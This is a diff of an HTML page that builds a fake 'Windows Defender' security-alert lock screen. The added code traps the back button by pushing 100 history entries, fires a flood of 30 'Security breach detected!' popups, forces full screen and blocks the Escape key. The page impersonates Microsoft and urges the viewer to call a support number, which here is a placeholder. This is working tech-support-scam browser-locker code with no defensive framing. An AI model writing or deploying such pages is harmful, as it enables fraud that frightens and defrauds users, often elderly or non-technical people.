@@ -1,69 +1,87 @@
+
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Fake Security Lock</title>
+  <title>Windows Security Alert</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     html, body {
       margin: 0;
       padding: 0;
-      background: black;
-      color: white;
+      background-color: #000;
+      color: #fff;
       font-family: sans-serif;
-      text-align: center;
+      overflow: hidden;
     }
-    .screen {
-      height: 100vh;
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: #111;
+      z-index: 9999;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
+      text-align: center;
       padding: 20px;
     }
     h1 {
       color: red;
     }
+    p {
+      font-size: 16px;
+      margin: 10px 0;
+    }
   </style>
   <script>
     let alertFlood = true;
-    let count = 0;
 
-    // Fill history stack deeply (so back keeps triggering)
+    // Deep history stack
     for (let i = 0; i < 100; i++) {
       history.pushState({}, '', location.href + '#' + i);
     }
 
-    // Start flooding alert on back
-    window.onpopstate = function () {
-      if (alertFlood) {
-        alertFlood = false;
-        recursiveAlert(0);
-      }
-    };
-
-    function recursiveAlert(n) {
-      if (n >= 30) return;
-      setTimeout(() => {
-        alert(`⚠️ Alert ${n + 1}/30: You are not allowed to go back!\nCall support immediately.`);
-        history.pushState({}, '', location.href + '#' + Math.random());
-        recursiveAlert(n + 1);
-      }, 200); // Adjust delay if needed
-    }
-
-    // Optional: auto full screen
+    // Lock fullscreen
     document.addEventListener("click", function () {
       let el = document.documentElement;
       if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+    });
+
+    // Trap back button
+    window.onpopstate = function () {
+      if (alertFlood) {
+        alertFlood = false;
+        showAlerts(0);
+      }
+    };
+
+    function showAlerts(n) {
+      if (n >= 30) return;
+      setTimeout(() => {
+        alert(`⚠️ Alert ${n + 1}/30: Security breach detected!`);
+        history.pushState({}, '', location.href + '#' + Math.random());
+        showAlerts(n + 1);
+      }, 200);
+    }
+
+    // Prevent escape with ESC key (some browsers)
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape') {
+        e.preventDefault();
+      }
     });
   </script>
 </head>
 <body>
-  <div class="screen">
-    <h1>⚠️ Windows Defender Alert</h1>
-    <p>Your device has been locked due to security issues.</p>
-    <p>Call Microsoft Support: <strong>+1-800-FAKE-NUM</strong></p>
-    <p>Pressing back is disabled for your protection.</p>
+  <div class="overlay">
+    <h1>⚠️ Windows Defender - Security Alert</h1>
+    <p>Your device has been locked due to a critical threat.</p>
+    <p>Call Microsoft Support immediately: <strong>+1-800-FAKE-NUM</strong></p>
+    <p>Do not press back or close this window.</p>
+    <p>Full screen mode active. Touch anywhere to continue.</p>
   </div>
 </body>
 </html>
